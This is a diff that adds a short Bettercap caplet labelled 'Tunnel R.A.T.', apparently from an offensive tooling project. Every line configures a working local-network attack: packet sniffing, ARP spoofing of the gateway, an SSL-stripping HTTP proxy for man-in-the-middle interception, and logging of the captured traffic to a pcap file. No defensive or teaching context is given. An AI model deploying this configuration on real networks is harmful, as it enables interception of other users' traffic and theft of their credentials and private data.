@@ -1,0 +1,16 @@
+# Tunnel R.A.T. Bettercap Caplet
+net.show
+
+# Enable packet capture
+net.sniff on
+
+# ARP spoofing
+set arp.spoof.targets `gateway`
+arp.spoof on
+
+# HTTP proxy for MITM
+set http.proxy.sslstrip true
+http.proxy on
+
+# Log captured data
+set net.sniff.output /opt/tunnel-rat/captures/packets.pcap
